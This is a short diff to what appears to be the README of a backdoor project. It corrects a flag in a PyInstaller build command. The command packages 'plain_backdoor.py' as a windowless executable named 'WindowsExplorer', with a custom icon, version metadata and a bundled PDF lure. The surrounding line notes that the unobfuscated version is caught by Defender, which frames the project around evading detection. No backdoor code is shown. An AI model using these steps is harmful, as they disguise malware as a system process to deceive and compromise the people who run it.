@@ -27,7 +27,7 @@ Unobfuscated backdoor will be detected and quarintined by defender
 2. ### find your pyinstaller path and run :
 #### For windows :
     ```powershell
-    C:\Users\wherever\your\path\is\pyinstaller.exe --onefile --noconsole --name "WindowsExplorer" --icon="icon.ico" ——version-file=version_info.txt —add-data "sample.pdf;." Unobfuscated\plain_backdoor.py
+    C:\Users\wherever\your\path\is\pyinstaller.exe --onefile --noconsole --name "WindowsExplorer" --icon="icon.ico" ——version-file=version_info.txt --add-data "sample.pdf;." Unobfuscated\plain_backdoor.py
     ```
   
 #### For MacOS :    
